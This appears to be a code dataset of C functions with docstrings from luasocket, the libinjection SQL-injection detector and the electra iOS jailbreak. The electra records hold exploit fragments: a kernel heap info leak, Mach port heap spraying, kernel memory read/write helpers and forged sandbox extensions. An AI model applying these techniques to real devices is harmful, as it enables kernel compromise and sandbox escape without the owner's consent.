{"docstring": "/*-------------------------------------------------------------------------*\\\n* Closes socket used by object \n\\*-------------------------------------------------------------------------*/\n", "func_signal": "static int meth_close(lua_State *L)", "code": "{\n    p_unix un = (p_unix) auxiliar_checkgroup(L, \"serial{any}\", 1);\n    socket_destroy(&un->sock);\n    lua_pushnumber(L, 1);\n    return 1;\n}", "path": "Quick-Cocos2dx-Community/external/lua/luasocket/serial.c", "commit_date": "2015-09-07 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/** In ANSI mode, hash is an operator\n *  In MYSQL mode, it's a EOL comment like '--'\n */\n", "func_signal": "static size_t parse_hash(struct libinjection_sqli_state * sf)", "code": "{\n    sf->stats_comment_hash += 1;\n    if (sf->flags & FLAG_SQL_MYSQL) {\n        sf->stats_comment_hash += 1;\n        return parse_eol_comment(sf);\n    } else {\n        st_assign_char(sf->current, TYPE_OPERATOR, sf->pos, 1, '#');\n        return sf->pos + 1;\n    }\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/*\n * binary literal string\n * re: [bB]'[01]*'\n */\n", "func_signal": "static size_t parse_bstring(struct libinjection_sqli_state *sf)", "code": "{\n    size_t wlen;\n    const char *cs = sf->s;\n    size_t pos = sf->pos;\n    size_t slen = sf->slen;\n\n    /* need at least 2 more characters\n     * if next char isn't a single quote, then\n     * continue as normal word\n     */\n    if (pos + 2 >= slen || cs[pos+1] !=  '\\'') {\n        return parse_word(sf);\n    }\n\n    wlen = strlenspn(cs + pos + 2, sf->slen - pos - 2, \"01\");\n    if (pos + 2 + wlen  >= slen || cs[pos + 2 + wlen] != '\\'') {\n        return parse_word(sf);\n    }\n    st_assign(sf->current, TYPE_NUMBER, pos, wlen + 3, cs + pos);\n    return pos + 2 + wlen + 1;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/** Find largest string containing certain characters.\n *\n * C Standard library 'strspn' only works for 'c-strings' (null terminated)\n * This works on arbitrary length.\n *\n * Performance notes:\n *   not critical\n *\n * Porting notes:\n *   if accept is 'ABC', then this function would be similar to\n *   a_regexp.match(a_str, '[ABC]*'),\n */\n", "func_signal": "static size_t\nstrlenspn(const char *s, size_t len, const char *accept)", "code": "{\n    size_t i;\n    for (i = 0; i < len; ++i) {\n        /* likely we can do better by inlining this function\n         * but this works for now\n         */\n        if (strchr(accept, s[i]) == NULL) {\n            return i;\n        }\n    }\n    return len;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/** See if two tokens can be merged since they are compound SQL phrases.\n *\n * This takes two tokens, and, if they are the right type,\n * merges their values together.  Then checks to see if the\n * new value is special using the PHRASES mapping.\n *\n * Example: \"UNION\" + \"ALL\" ==> \"UNION ALL\"\n *\n * C Security Notes: this is safe to use C-strings (null-terminated)\n *  since the types involved by definition do not have embedded nulls\n *  (e.g. there is no keyword with embedded null)\n *\n * Porting Notes: since this is C, it's oddly complicated.\n *  This is just:  multikeywords[token.value + ' ' + token2.value]\n *\n */\n", "func_signal": "static int syntax_merge_words(struct libinjection_sqli_state * sf,stoken_t * a, stoken_t * b)", "code": "{\n    size_t sz1;\n    size_t sz2;\n    size_t sz3;\n    char tmp[LIBINJECTION_SQLI_TOKEN_SIZE];\n    char ch;\n\n    /* first token is of right type? */\n    if (!\n        (a->type == TYPE_KEYWORD ||\n         a->type == TYPE_BAREWORD ||\n         a->type == TYPE_OPERATOR ||\n         a->type == TYPE_UNION ||\n         a->type == TYPE_FUNCTION ||\n         a->type == TYPE_EXPRESSION ||\n         a->type == TYPE_TSQL ||\n         a->type == TYPE_SQLTYPE)) {\n        return FALSE;\n    }\n\n    if (!\n        (b->type == TYPE_KEYWORD ||\n         b->type == TYPE_BAREWORD ||\n         b->type == TYPE_OPERATOR ||\n         b->type == TYPE_UNION ||\n         b->type == TYPE_FUNCTION ||\n         b->type == TYPE_EXPRESSION ||\n         b->type == TYPE_TSQL ||\n         b->type == TYPE_SQLTYPE ||\n         b->type == TYPE_LOGIC_OPERATOR)) {\n        return FALSE;\n    }\n\n    sz1 = a->len;\n    sz2 = b->len;\n    sz3 = sz1 + sz2 + 1; /* +1 for space in the middle */\n    if (sz3 >= LIBINJECTION_SQLI_TOKEN_SIZE) { /* make sure there is room for ending null */\n        return FALSE;\n    }\n    /*\n     * oddly annoying  last.val + ' ' + current.val\n     */\n    memcpy(tmp, a->val, sz1);\n    tmp[sz1] = ' ';\n    memcpy(tmp + sz1 + 1, b->val, sz2);\n    tmp[sz3] = CHAR_NULL;\n    ch = sf->lookup(sf, LOOKUP_WORD, tmp, sz3);\n\n    if (ch != CHAR_NULL) {\n        st_assign(a, ch, a->pos, sz3, tmp);\n        return TRUE;\n    } else {\n        return FALSE;\n    }\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/**\n * Used when first char is a ' or \"\n */\n", "func_signal": "static size_t parse_string(struct libinjection_sqli_state * sf)", "code": "{\n    const char *cs = sf->s;\n    const size_t slen = sf->slen;\n    size_t pos = sf->pos;\n\n    /*\n     * assert cs[pos] == single or double quote\n     */\n    return parse_string_core(cs, slen, pos, sf->current, cs[pos], 1);\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/* MySQL backticks are a cross between string and\n * and a bare word.\n *\n */\n", "func_signal": "static size_t parse_tick(struct libinjection_sqli_state* sf)", "code": "{\n    size_t pos =  parse_string_core(sf->s, sf->slen, sf->pos, sf->current, CHAR_TICK, 1);\n\n    /* we could check to see if start and end of\n     * of string are both \"`\", i.e. make sure we have\n     * matching set.  `foo` vs. `foo\n     * but I don't think it matters much\n     */\n\n    /* check value of string to see if it's a keyword,\n     * function, operator, etc\n     */\n    char ch = sf->lookup(sf, LOOKUP_WORD, sf->current->val, sf->current->len);\n    if (ch == TYPE_FUNCTION) {\n        /* if it's a function, then convert token */\n        sf->current->type = TYPE_FUNCTION;\n    } else {\n        /* otherwise it's a 'n' type -- mysql treats\n         * everything as a bare word\n         */\n        sf->current->type = TYPE_BAREWORD;\n    }\n    return pos;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/*\n * Ok!   \"  \\\"   \"  one backslash = escaped!\n *       \" \\\\\"   \"  two backslash = not escaped!\n *       \"\\\\\\\"   \"  three backslash = escaped!\n */\n", "func_signal": "static int is_backslash_escaped(const char* end, const char* start)", "code": "{\n    const char* ptr;\n    for (ptr = end; ptr >= start; ptr--) {\n        if (*ptr != '\\\\') {\n            break;\n        }\n    }\n    /* if number of backslashes is odd, it is escaped */\n\n    return (end - ptr) & 1;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/*\n * This function is mostly use with SWIG\n */\n", "func_signal": "struct libinjection_sqli_token*\nlibinjection_sqli_get_token(struct libinjection_sqli_state * sql_state, int i)", "code": "{\n    if (i < 0 || i > (int)LIBINJECTION_SQLI_MAX_TOKENS) {\n        return NULL;\n    }\n    return &(sql_state->tokenvec[i]);\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/**\n *\n *\n *\n * Porting Notes:\n *  given a mapping/hash of string to char\n *  this is just\n *    typecode = mapping[key.upper()]\n */\n", "func_signal": "static char bsearch_keyword_type(const char *key, size_t len,\n                                 const keyword_t * keywords, size_t numb)", "code": "{\n    size_t pos;\n    size_t left = 0;\n    size_t right = numb - 1;\n\n    while (left < right) {\n        pos = (left + right) >> 1;\n\n        /* arg0 = upper case only, arg1 = mixed case */\n        if (cstrcasecmp(keywords[pos].word, key, len) < 0) {\n            left = pos + 1;\n        } else {\n            right = pos;\n        }\n    }\n    if ((left == right) && cstrcasecmp(keywords[left].word, key, len) == 0) {\n        return keywords[left].type;\n    } else {\n        return CHAR_NULL;\n    }\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/* secondary api: detects SQLi in a string, GIVEN a context.\n *\n * A context can be:\n *   *  CHAR_NULL (\\0), process as is\n *   *  CHAR_SINGLE ('), process pretending input started with a\n *          single quote.\n *   *  CHAR_DOUBLE (\"), process pretending input started with a\n *          double quote.\n *\n */\n", "func_signal": "const char* libinjection_sqli_fingerprint(struct libinjection_sqli_state * sql_state, int flags)", "code": "{\n    int i;\n    int tlen = 0;\n\n    libinjection_sqli_reset(sql_state, flags);\n\n    tlen = libinjection_sqli_fold(sql_state);\n\n    /* Check for magic PHP backquote comment\n     * If:\n     * * last token is of type \"bareword\"\n     * * And is quoted in a backtick\n     * * And isn't closed\n     * * And it's empty?\n     * Then convert it to comment\n     */\n    if (tlen > 2 &&\n        sql_state->tokenvec[tlen-1].type == TYPE_BAREWORD &&\n        sql_state->tokenvec[tlen-1].str_open == CHAR_TICK &&\n        sql_state->tokenvec[tlen-1].len == 0 &&\n        sql_state->tokenvec[tlen-1].str_close == CHAR_NULL) {\n        sql_state->tokenvec[tlen-1].type = TYPE_COMMENT;\n    }\n\n    for (i = 0; i < tlen; ++i) {\n        sql_state->fingerprint[i] = sql_state->tokenvec[i].type;\n    }\n\n    /*\n     * make the fingerprint pattern a c-string (null delimited)\n     */\n    sql_state->fingerprint[tlen] = CHAR_NULL;\n\n    /*\n     * check for 'X' in pattern, and then\n     * clear out all tokens\n     *\n     * this means parsing could not be done\n     * accurately due to pgsql's double comments\n     * or other syntax that isn't consistent.\n     * Should be very rare false positive\n     */\n    if (strchr(sql_state->fingerprint, TYPE_EVIL)) {\n        /*  needed for SWIG */\n        memset((void*)sql_state->fingerprint, 0, LIBINJECTION_SQLI_MAX_TOKENS + 1);\n        memset((void*)sql_state->tokenvec[0].val, 0, LIBINJECTION_SQLI_TOKEN_SIZE);\n\n        sql_state->fingerprint[0] = TYPE_EVIL;\n\n        sql_state->tokenvec[0].type = TYPE_EVIL;\n        sql_state->tokenvec[0].val[0] = TYPE_EVIL;\n        sql_state->tokenvec[1].type = CHAR_NULL;\n    }\n\n\n    return sql_state->fingerprint;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/** This detects MySQL comments, comments that\n * start with /x!   We just ban these now but\n * previously we attempted to parse the inside\n *\n * For reference:\n * the form of /x![anything]x/ or /x!12345[anything] x/\n *\n * Mysql 3 (maybe 4), allowed this:\n *    /x!0selectx/ 1;\n * where 0 could be any number.\n *\n * The last version of MySQL 3 was in 2003.\n\n * It is unclear if the MySQL 3 syntax was allowed\n * in MySQL 4.  The last version of MySQL 4 was in 2008\n *\n */\n", "func_signal": "static size_t is_mysql_comment(const char *cs, const size_t len, size_t pos)", "code": "{\n    /* so far...\n     * cs[pos] == '/' && cs[pos+1] == '*'\n     */\n\n    if (pos + 2 >= len) {\n        /* not a mysql comment */\n        return 0;\n    }\n\n    if (cs[pos + 2] != '!') {\n        /* not a mysql comment */\n        return 0;\n    }\n\n    /*\n     * this is a mysql comment\n     *  got \"/x!\"\n     */\n    return 1;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/* DANGER DANGER\n * This is -very specialized function-\n *\n * this compares a ALL_UPPER CASE C STRING\n * with a *arbitrary memory* + length\n *\n * Sane people would just make a copy, up-case\n * and use a hash table.\n *\n * Required since libc version uses the current locale\n * and is much slower.\n */\n", "func_signal": "static int cstrcasecmp(const char *a, const char *b, size_t n)", "code": "{\n    char cb;\n\n    for (; n > 0; a++, b++, n--) {\n        cb = *b;\n        if (cb >= 'a' && cb <= 'z') {\n            cb -= 0x20;\n        }\n        if (*a != cb) {\n            return *a - cb;\n        } else if (*a == '\\0') {\n            return -1;\n        }\n    }\n\n    return (*a == 0) ? 0 : 1;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/**\n * Used when first char is:\n *    N or n:  mysql \"National Character set\"\n *    E     :  psql  \"Escaped String\"\n */\n", "func_signal": "static size_t parse_estring(struct libinjection_sqli_state * sf)", "code": "{\n    const char *cs = sf->s;\n    const size_t slen = sf->slen;\n    size_t pos = sf->pos;\n\n    if (pos + 2 >= slen || cs[pos+1] != CHAR_SINGLE) {\n        return parse_word(sf);\n    }\n    return parse_string_core(cs, slen, pos, sf->current, CHAR_SINGLE, 2);\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/* memchr2 finds a string of 2 characters inside another string\n * This a specialized version of \"memmem\" or \"memchr\".\n * 'memmem' doesn't exist on all platforms\n *\n * Porting notes: this is just a special version of\n *    astring.find(\"AB\")\n *\n */\n", "func_signal": "static const char *\nmemchr2(const char *haystack, size_t haystack_len, char c0, char c1)", "code": "{\n    const char *cur = haystack;\n    const char *last = haystack + haystack_len - 1;\n\n    if (haystack_len < 2) {\n        return NULL;\n    }\n\n    while (cur < last) {\n        /* safe since cur < len - 1 always */\n        if (cur[0] == c0 && cur[1] == c1) {\n            return cur;\n        }\n        cur += 1;\n    }\n\n    return NULL;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/*\n * hex literal string\n * re: [xX]'[0123456789abcdefABCDEF]*'\n * mysql has requirement of having EVEN number of chars,\n *  but pgsql does not\n */\n", "func_signal": "static size_t parse_xstring(struct libinjection_sqli_state *sf)", "code": "{\n    size_t wlen;\n    const char *cs = sf->s;\n    size_t pos = sf->pos;\n    size_t slen = sf->slen;\n\n    /* need at least 2 more characters\n     * if next char isn't a single quote, then\n     * continue as normal word\n     */\n    if (pos + 2 >= slen || cs[pos+1] !=  '\\'') {\n        return parse_word(sf);\n    }\n\n    wlen = strlenspn(cs + pos + 2, sf->slen - pos - 2, \"0123456789ABCDEFabcdef\");\n    if (pos + 2 + wlen  >= slen || cs[pos + 2 + wlen] != '\\'') {\n        return parse_word(sf);\n    }\n    st_assign(sf->current, TYPE_NUMBER, pos, wlen + 3, cs + pos);\n    return pos + 2 + wlen + 1;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/*\n * mysql's N'STRING' or\n * ...  Oracle's nq string\n */\n", "func_signal": "static size_t parse_nqstring(struct libinjection_sqli_state * sf)", "code": "{\n    size_t slen = sf->slen;\n    size_t pos = sf->pos;\n    if (pos + 2 < slen && sf->s[pos+1] == CHAR_SINGLE) {\n        return parse_estring(sf);\n    }\n    return parse_qstring_core(sf, 1);\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/**  Main API, detects SQLi in an input.\n *\n *\n */\n", "func_signal": "static int reparse_as_mysql(struct libinjection_sqli_state * sql_state)", "code": "{\n    return sql_state->stats_comment_ddx ||\n        sql_state->stats_comment_hash;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/**\n * This handles MS SQLSERVER bracket words\n * http://stackoverflow.com/questions/3551284/sql-serverwhat-do-brackets-mean-around-column-name\n *\n */\n", "func_signal": "static size_t parse_bword(struct libinjection_sqli_state * sf)", "code": "{\n    const char *cs = sf->s;\n    size_t pos = sf->pos;\n    const char* endptr = (const char*) memchr(cs + pos, ']', sf->slen - pos);\n    if (endptr == NULL) {\n        st_assign(sf->current, TYPE_BAREWORD, pos, sf->slen - pos, cs + pos);\n        return sf->slen;\n    } else {\n        st_assign(sf->current, TYPE_BAREWORD, pos, (size_t)(endptr - cs) - pos + 1, cs + pos);\n        return (size_t)((endptr - cs) + 1);\n    }\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/**\n * memmem might not exist on some systems\n */\n", "func_signal": "static const char *\nmy_memmem(const char* haystack, size_t hlen, const char* needle, size_t nlen)", "code": "{\n    const char* cur;\n    const char* last;\n    assert(haystack);\n    assert(needle);\n    assert(nlen > 1);\n    last =  haystack + hlen - nlen;\n    for (cur = haystack; cur <= last; ++cur) {\n        if (cur[0] == needle[0] && memcmp(cur, needle, nlen) == 0) {\n            return cur;\n        }\n    }\n    return NULL;\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "/* Look forward for doubling of delimiter\n *\n * case 'foo''bar' --> foo''bar\n *\n * ending quote isn't duplicated (i.e. escaped)\n * since it's the wrong char or EOL\n *\n */\n", "func_signal": "static size_t parse_string_core(const char *cs, const size_t len, size_t pos,\n                                stoken_t * st, char delim, size_t offset)", "code": "{\n    /*\n     * offset is to skip the perhaps first quote char\n     */\n    const char *qpos =\n        (const char *) memchr((const void *) (cs + pos + offset), delim,\n                              len - pos - offset);\n\n    /*\n     * then keep string open/close info\n     */\n    if (offset > 0) {\n        /*\n         * this is real quote\n         */\n        st->str_open = delim;\n    } else {\n        /*\n         * this was a simulated quote\n         */\n        st->str_open = CHAR_NULL;\n    }\n\n    while (TRUE) {\n        if (qpos == NULL) {\n            /*\n             * string ended with no trailing quote\n             * assign what we have\n             */\n            st_assign(st, TYPE_STRING, pos + offset, len - pos - offset, cs + pos + offset);\n            st->str_close = CHAR_NULL;\n            return len;\n        } else if ( is_backslash_escaped(qpos - 1, cs + pos + offset)) {\n            /* keep going, move ahead one character */\n            qpos =\n                (const char *) memchr((const void *) (qpos + 1), delim,\n                                      (size_t)((cs + len) - (qpos + 1)));\n            continue;\n        } else if (is_double_delim_escaped(qpos, cs + len)) {\n            /* keep going, move ahead two characters */\n            qpos =\n                (const char *) memchr((const void *) (qpos + 2), delim,\n                                      (size_t)((cs + len) - (qpos + 2)));\n            continue;\n        } else {\n            /* hey it's a normal string */\n            st_assign(st, TYPE_STRING, pos + offset,\n                      (size_t)(qpos - (cs + pos + offset)), cs + pos + offset);\n            st->str_close = delim;\n            return (size_t)(qpos - cs + 1);\n        }\n    }\n}", "path": "libinjection/src/libinjection_sqli.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "client9/libinjection", "stars": 974, "license": "other", "language": "c", "size": 5579}
{"docstring": "// 1 on success, 0 on error\n", "func_signal": "int OSArray_Merge(uint64_t array, uint64_t aArray)", "code": "{\n\tuint64_t vtab = rk64(array);\n\tuint64_t f = rk64(vtab + off_OSArray_Merge);\n\n\treturn (int) kexecute(f, array, aArray, 0, 0, 0, 0, 0);\n}", "path": "electra/basebinaries/jailbreakd/osobject.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// task_self_addr points to the struct ipc_port for our task port\n", "func_signal": "uint64_t find_kernel_vm_map(uint64_t task_self_addr)", "code": "{\n  uint64_t struct_task = rk64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n  \n  while (struct_task != 0) {\n    uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));\n    \n    uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));\n    \n    if (pid == 0) {\n      uint64_t vm_map = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));\n      return vm_map;\n    }\n    \n    struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));\n  }\n  \n  printf(\"unable to find kernel task...\\n\");\n  sleep(10);\n  exit(EXIT_FAILURE);\n}", "path": "electra/electra/exploit/async_wake.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// i don't think anyone uses this function anymore, but it's here for completeness\n", "func_signal": "void MSHookClassPair(Class _class, Class hook, Class old)", "code": "{\n    unsigned int n_methods = 0;\n    Method *hooks = class_copyMethodList(hook, &n_methods);\n    \n    for (unsigned int i = 0; i < n_methods; ++i) {\n        SEL selector = method_getName(hooks[i]);\n        const char *what = method_getTypeEncoding(hooks[i]);\n        \n        Method old_mptr = class_getInstanceMethod(old, selector);\n        Method cls_mptr = class_getInstanceMethod(_class, selector);\n        \n        if (cls_mptr) {\n            class_addMethod(old, selector, method_getImplementation(hooks[i]), what);\n            method_exchangeImplementations(cls_mptr, old_mptr);\n        } else {\n            class_addMethod(_class, selector, method_getImplementation(hooks[i]), what);\n        }\n    }\n    \n    free(hooks);\n}", "path": "electra/libsubstrate/libsubstrate.c", "commit_date": "2018-01-14 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// 1 on success, 0 on error\n", "func_signal": "int OSDictionary_Merge(uint64_t dict, uint64_t aDict)", "code": "{\n\tuint64_t vtab = rk64(dict);\n\tuint64_t f = rk64(vtab + off_OSDictionary_Merge);\n\n\treturn (int) kexecute(f, dict, aDict, 0, 0, 0, 0, 0);\n}", "path": "electra/basebinaries/jailbreakd/osobject.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// 1 on success, 0 on error\n", "func_signal": "int OSDictionary_SetItem(uint64_t dict, const char *key, uint64_t val)", "code": "{\n\tsize_t len = strlen(key) + 1;\n\n\tuint64_t ks = kalloc(len);\n\tkwrite(ks, key, len);\n\n\tuint64_t vtab = rk64(dict);\n\tuint64_t f = rk64(vtab + off_OSDictionary_SetObjectWithCharP);\n\n\tint rv = (int) kexecute(f, dict, ks, val, 0, 0, 0, 0);\n\n\tkfree(ks, len);\n\n\treturn rv;\n}", "path": "electra/basebinaries/jailbreakd/osobject.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// Notice: path should *not* end with '/' !\n", "func_signal": "uint64_t extension_create_file(const char* path, uint64_t nextptr)", "code": "{\n\tsize_t slen = strlen(path);\n\n\tif (path[slen - 1] == '/') {\n\t\tfprintf(stderr, \"No traling slash in path pls\\n\");\n\t\treturn 0;\n\t}\n\n\tuint64_t ext_p = smalloc(sizeof(struct extension));\n\tuint64_t ks = sstrdup(path);\n\n\tif (ext_p && ks) {\n\t\tstruct extension ext;\n\t\tbzero(&ext, sizeof(ext));\n\t\text.next = nextptr;\n\t\text.desc = 0xffffffffffffffff;\n\t\t\n\t\t// ext.type = 0;\n\t\t// ext.subtype = 0;\n\n\t\text.data = ks;\n\t\text.data_len = slen;\n\n\t\tkwrite(ext_p, &ext, sizeof(ext));\n\t} else {\n\t\t// XXX oh no a leak\n\t}\n\n\treturn ext_p;\n}", "path": "electra/basebinaries/jailbreakd/sandbox.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// XXX error handling just for fun? :)\n", "func_signal": "uint64_t _OSUnserializeXML(const char* buffer)", "code": "{\n\tsize_t len = strlen(buffer) + 1;\n\n\tuint64_t ks = kalloc(len);\n\tkwrite(ks, buffer, len);\n\n\tuint64_t errorptr = 0;\n\n\tuint64_t rv = kexecute(find_osunserializexml(), ks, errorptr, 0, 0, 0, 0, 0);\n\tkfree(ks, len);\n\n\treturn rv;\n}", "path": "electra/basebinaries/jailbreakd/osobject.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// fills a kalloc allocation with count times of target_port's struct ipc_port pointer\n// To cause the kalloc allocation to be free'd mach_port_destroy the returned receive right\n", "func_signal": "static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)", "code": "{\n  // allocate a port to send the message to\n  mach_port_t q = MACH_PORT_NULL;\n  kern_return_t err;\n  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);\n  if (err != KERN_SUCCESS) {\n    printf(\" [-] failed to allocate port\\n\");\n    exit(EXIT_FAILURE);\n  }\n  \n  mach_port_t* ports = malloc(sizeof(mach_port_t) * count);\n  for (int i = 0; i < count; i++) {\n    ports[i] = target_port;\n  }\n  \n  struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));\n  \n  msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);\n  msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);\n  msg->hdr.msgh_remote_port = q;\n  msg->hdr.msgh_local_port = MACH_PORT_NULL;\n  msg->hdr.msgh_id = 0x41414141;\n  \n  msg->body.msgh_descriptor_count = 1;\n  \n  msg->ool_ports.address = ports;\n  msg->ool_ports.count = count;\n  msg->ool_ports.deallocate = 0;\n  msg->ool_ports.disposition = disposition;\n  msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;\n  msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;\n  \n  err = mach_msg(&msg->hdr,\n                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,\n                 (mach_msg_size_t)sizeof(struct ool_msg),\n                 0,\n                 MACH_PORT_NULL,\n                 MACH_MSG_TIMEOUT_NONE,\n                 MACH_PORT_NULL);\n  \n  if (err != KERN_SUCCESS) {\n    printf(\" [-] failed to send message: %s\\n\", mach_error_string(err));\n    exit(EXIT_FAILURE);\n  }\n  \n  return q;\n}", "path": "electra/electra/exploit/find_port.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// will make a kalloc allocation of (count*8)+7\n// and only write to the first (count*8) bytes.\n// the return value is those last 7 bytes uninitialized bytes as a uint64_t\n// (the upper byte will be set to 0)\n", "func_signal": "static uint64_t try_leak(int count)", "code": "{\n  int buf_size = (count*8)+7;\n  char* buf = calloc(buf_size+1, 1);\n  \n  int err = proc_list_uptrs(getpid(), (void*)buf, buf_size);\n  \n  if (err == -1) {\n    return 0;\n  }\n  \n  // the last 7 bytes will contain the leaked data:\n  uint64_t last_val = ((uint64_t*)buf)[count]; // we added an extra zero byte in the calloc\n  \n  return last_val;\n}", "path": "electra/electra/exploit/find_port.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// appends n_events user events onto this process's kevent queue\n", "func_signal": "static void fill_events(int n_events)", "code": "{\n  struct kevent_qos_s events_id[] = {{\n    .filter = EVFILT_USER,\n    .ident = 1,\n    .flags = EV_ADD,\n    .udata = 0x2345\n  }};\n  \n  kqueue_id_t id = 0x1234;\n  \n  for (int i = 0; i < n_events; i++) {\n    int err = kevent_id(id, events_id, 1, NULL, 0, NULL, NULL,\n                        KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);\n    \n    if (err != 0) {\n      printf(\" [-] failed to enqueue user event\\n\");\n      exit(EXIT_FAILURE);\n    }\n    \n    events_id[0].ident++;\n  }\n}", "path": "electra/electra/exploit/find_port.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
